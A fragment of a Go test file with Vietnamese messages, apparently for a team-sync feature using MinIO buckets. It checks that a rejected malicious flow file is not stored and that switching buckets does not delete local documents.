	if _, err := os.Stat(filepath.Join(b.dataDir(), "flows", "demo", "leak.yaml")); !os.IsNotExist(err) {
		t.Fatal("flow độc đã vào kho flow sau khi chọn")
	}
}

// Đổi bucket trong Cài đặt: state.json của bucket cũ không làm tệp ở máy bị coi là "người khác đã xoá".
func TestSyncBucketChangeKeepsLocalFiles(t *testing.T) {
	stores := map[string]*teamsync.MemStore{"chatqa-team": teamsync.NewMemStore(), "chatqa-new": teamsync.NewMemStore()}
	m := configured(t, stores["chatqa-team"], "PC-A")
	m.svc.sync.deps.OpenStore = func(c teamsync.MinioConfig) (teamsync.ObjectStore, error) { return stores[c.Bucket], nil }
	if _, err := m.e.Docs.Save("demo", "prd-checkout", checkoutDoc); err != nil {
		t.Fatal(err)
	}
	if res, err := m.svc.SyncPush(nil); err != nil || len(res.Pushed) != 1 {
		t.Fatalf("đẩy lên bucket cũ: %+v %v", res, err)
	}
	if _, err := m.svc.SetSyncConfig(SyncConfig{Endpoint: "minio.local:9000", Bucket: "chatqa-new", UseTLS: true}); err != nil {
		t.Fatal(err)
	}
	if res, err := m.svc.SyncPull(nil); err != nil || len(res.Deleted) != 0 {
		t.Fatalf("kéo từ bucket mới không được xoá gì: %+v %v", res, err)
	}
	if _, err := os.Stat(docFile(m)); err != nil {
		t.Fatalf("tài liệu ở máy bị xoá: %v", err)
	}
	if res, err := m.svc.SyncPush(nil); err != nil || len(res.Pushed) != 1 {
		t.Fatalf("đẩy lên bucket mới phải tải tài liệu: %+v %v", res, err)
	}
}
